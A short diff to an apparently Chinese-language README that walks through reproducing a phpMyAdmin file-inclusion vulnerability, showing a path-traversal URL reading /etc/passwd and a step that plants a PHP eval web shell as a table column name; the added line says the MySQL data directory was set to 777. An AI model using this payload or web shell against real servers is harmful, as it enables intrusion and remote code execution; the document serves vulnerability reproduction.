@@ -23,6 +23,8 @@ http://127.0.0.1/index.php?target=db_sql.php%253f/../../etc/passwd
 
 先利用 phpmyadmin创建一个数据库flask,然后创建一个shadow的表，创建名为 <?php eval($_GET[shadow]); ?>的列，当前数据库的物理存储路径是_var_lib/mysql
 
+这边也有一个问题，权限，我将/var/lib/mysql的权限设为了777
+
 ![](README/D6946A77-A26B-4D62-A78C-742A59DDE3E0.png)
 
 
